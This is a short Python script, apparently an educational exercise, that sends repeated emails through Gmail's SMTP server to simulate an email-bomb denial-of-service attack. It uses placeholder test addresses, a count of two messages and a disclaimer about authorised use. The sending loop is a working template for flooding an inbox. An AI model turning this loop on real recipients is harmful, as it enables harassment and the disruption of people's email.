# this here is for a simulated DoS attack, in this case its an Email Bomb, since were dealing with emails

import os
from email.message import EmailMessage
import ssl
import smtplib
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Enter your sender and receiver emails
email_sender = 'emailTestSender@gmail.com'
email_password = os.environ.get("EMAIL_PASS")
email_receiver = 'emailTestReceiver@gmail.com'

# Your actual email message you want to send
subject = 'DoS Attack Simulation'
body = """
This is a simulated Denial of Service (DoS) attack.

Please be advised that this is a test and not a real attack.

This message is part of a security assessment to evaluate the resilience of our email infrastructure.

Thank you.
"""

# Number of emails to send for the DoS attack (2 since this is just testing)
num_emails = 2

# Create SSL context for secure connection
context = ssl.create_default_context()

# Establish connection with Gmail's SMTP server
with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
    # Authenticate with sender's email and password
    smtp.login(email_sender, email_password)

    # Send multiple emails to simulate DoS attack
    for i in range(num_emails):
        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['Subject'] = subject
        em.set_content(body)

        # Send email
        smtp.sendmail(email_sender, email_receiver, em.as_string())

        print(f"Email {i+1} sent")

print("DoS attack simulation completed.")


# DISCLAIMER: 
# This script is intended for educational and simulation purposes only. 
# It simulates a type of Denial of Service (DoS) attack known as an Email Bomb, 
# which involves sending a large volume of emails to overwhelm the recipient's inbox, potentially rendering it unusable. 
# 
# USAGE WARNING: 
# Using this script against unauthorized targets or without their explicit consent 
# may violate laws and regulations. 
# 
# RESPONSIBLE USAGE: 
# Ensure that you have the necessary permissions and authorization before using this script. 
# Always respect the privacy and rights of others, and use this script only for lawful, ethical, 
# and simulated testing purposes. 
# 
# The author and contributors of this script are not responsible for any misuse or damage caused by its usage. 
